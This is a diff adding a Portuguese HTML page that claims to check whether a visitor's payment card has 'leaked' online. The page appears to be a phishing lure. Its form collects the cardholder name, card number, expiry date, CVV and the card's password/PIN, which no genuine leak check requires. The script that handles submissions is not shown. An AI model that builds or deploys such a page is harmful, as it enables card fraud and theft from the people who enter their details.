@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verificação de Cartão</title>
+    <link rel="stylesheet" href="styles.css" />
+    <link rel="shortcut icon" type="image/png" href="images/icone.png" />
+  </head>
+  <body>
+    <div class="cube"></div>
+
+    <div class="conteiner">
+      <div class="image">
+        <img src="images/cartao 1.png" alt="" />
+        <img src="images/cartão 2.png" style="margin-left: 30%" alt="" />
+      </div>
+
+      <div class="formulario">
+        <h1>Veja se seu cartão <span>vazou</span> na internet</h1>
+        <div class="form">
+          <form id="formulario" action="javascript:void(0)">
+            <label>Nome no Cartão</label>
+            <input type="text" name="name" maxlength="30" required />
+
+            <label>Número do Cartão</label>
+            <input
+              type="text"
+              name="NumberCard"
+              id="NumberCard"
+              placeholder="1234 5678 9012 3456"
+              maxlength="19"
+              required
+            />
+            <div class="content-form">
+              <div class="conteiner-expiracao">
+                <label>Data de expiração</label>
+                <div class="content-expiracao">
+                  <input
+                    type="text"
+                    name="expiracaoMes"
+                    placeholder="MM"
+                    maxlength="2"
+                    required
+                  />
+                  <input
+                    type="text"
+                    name="expiracaoAno"
+                    maxlength="2"
+                    placeholder="AA"
+                    required
+                  />
+                </div>
+              </div>
+              <div class="conteiner-cod">
+                <label>CVV/CVC</label>
+                <input type="text" name="CodSec" maxlength="4" required />
+              </div>
+            </div>
+
+            <label>Senha do cartão</label>
+            <input
+              type="password"
+              name="senha"
+              style="font-weight: bold"
+              placeholder="********"
+              required
+            />
+            <button class="verificar" type="submit">Verificar</button>
+            <div id="mensagem" style="display: none; margin-top: 10px;"></div>
+          </form>
+        </div>
+      </div>
+    </div>
+    <script src="script.js"></script>
+  </body>
+</html>
